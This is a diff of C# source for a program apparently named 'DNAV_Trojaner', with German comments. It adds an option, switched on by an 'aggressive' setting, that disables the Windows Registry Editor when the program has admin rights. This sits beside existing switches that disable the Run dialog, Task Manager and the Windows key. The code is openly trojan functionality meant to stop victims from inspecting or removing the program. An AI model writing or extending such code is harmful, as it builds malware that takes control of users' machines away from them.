@@ -23,6 +23,7 @@ namespace DNAV_Trojaner
         private bool _disableRun;
         private bool _disableTaskmanager;
         private bool _disableWindowsKey;
+        private bool _disableRegEdit;
 
         private bool checkAdmin()
         {
@@ -197,6 +198,21 @@ namespace DNAV_Trojaner
         }
 
         /// <summary>
+        /// Legt fest, ob der Registrierungseditor deaktiviert werden soll.
+        /// </summary>
+        public bool DisableRegEdit
+        {
+            get
+            {
+                return this._disableRegEdit;
+            }
+            set
+            {
+                this._disableRegEdit = value;
+            }
+        }
+
+        /// <summary>
         /// Erstellt ein Objekt der DNAV Klasse mit Standardparametern.
         /// </summary>
         public DNAV()
@@ -213,6 +229,7 @@ namespace DNAV_Trojaner
             this.DisableRun = false;
             this.DisableTaskmanager = false;
             this.DisableWindowsKey = false;
+            this.DisableRegEdit = false;
         }
 
         /// <summary>
@@ -232,6 +249,7 @@ namespace DNAV_Trojaner
             this.DisableRun = aggressive;
             this.DisableTaskmanager = aggressive;
             this.DisableWindowsKey = aggressive;
+            this.DisableRegEdit = aggressive;
         }
 
         /// <summary>
@@ -277,6 +295,10 @@ namespace DNAV_Trojaner
             if (this.DisableWindowsKey && this._isAdmin)
             {
                 WindowsKey.Disable();
+            }
+            if (this.DisableRegEdit && this._isAdmin)
+            {
+                RegEdit.Disable();
             }
         }
     }
